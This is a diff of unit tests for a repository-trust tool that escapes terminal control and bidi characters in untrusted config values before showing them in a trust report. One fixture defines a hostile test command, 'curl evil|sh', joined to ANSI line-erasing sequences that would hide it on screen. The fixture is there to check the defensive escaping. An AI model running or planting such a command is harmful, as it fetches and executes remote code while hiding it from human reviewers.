@@ -8,6 +8,7 @@ import {
   clearRepoTrust,
   collectRepoExecutionConfig,
   collectRepoInventory,
+  escapeTerminalControls,
   evaluateRepoTrust,
   formatRepoTrustReport,
   guardBaselineForLanguage,
@@ -429,6 +430,19 @@ describe("collectRepoInventory and symlinks (#686 finding 4)", () => {
   }
 });
 
+describe("escapeTerminalControls", () => {
+  it("renders C0, DEL, C1 and bidi controls as visible escapes and leaves other text alone", () => {
+    expect(escapeTerminalControls("a\u0000\t\n\u007f\u0085‮⁦b é ✓")).toBe(
+      "a\\x00\\x09\\x0a\\x7f\\x85\\u202e\\u2066b é ✓",
+    );
+  });
+
+  it("is idempotent", () => {
+    const once = escapeTerminalControls("x\u001b[2K\r");
+    expect(escapeTerminalControls(once)).toBe(once);
+  });
+});
+
 describe("formatRepoTrustReport", () => {
   it("names the state, the findings, the inventory and the accept command", () => {
     writeJson(".hench/config.json", { guard: { ...DEFAULT_GUARD, allowedCommands: [...DEFAULT_GUARD.allowedCommands, "bash"] } });
@@ -439,6 +453,27 @@ describe("formatRepoTrustReport", () => {
     expect(lines.some((l) => l.includes("bash"))).toBe(true);
     expect(lines.some((l) => l.includes("PRD: 1 item(s) in 1 epic(s)"))).toBe(true);
     expect(lines.at(-1)).toContain("ndx trust accept .");
+  });
+
+  it("escapes terminal control characters in repository values; the digest keeps the raw value", () => {
+    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
+    writeJson(".rex/config.json", { test: command });
+    writeJson(".mcp.json", { mcpServers: { "x\u001b]0;t\u0007": { command: "run\u009b2K" } } });
+    writeJson(".sourcevision/manifest.json", { analyzedAt: "2026\r\u001b[2K" });
+
+    const ev = evaluateRepoTrust(repo, { ndxHome: home });
+    const lines = formatRepoTrustReport(ev, { inventory: true });
+    for (const line of lines) expect(line).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
+    const text = lines.join("\n");
+    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
+    expect(text).toContain("x\\x1b]0;t\\x07: run\\x9b2K");
+
+    // Display only: the evaluated config and finding values stay raw, and an
+    // acceptance recorded from them matches the same raw config.
+    expect(ev.config.testCommand).toBe(command);
+    expect(ev.findings.find((f) => f.code === "test-command")?.values).toEqual([command]);
+    recordRepoTrust(repo, { ndxHome: home });
+    expect(evaluateRepoTrust(repo, { ndxHome: home }).state).toBe("trusted");
   });
 
   it("is one quiet line for a baseline repository", () => {
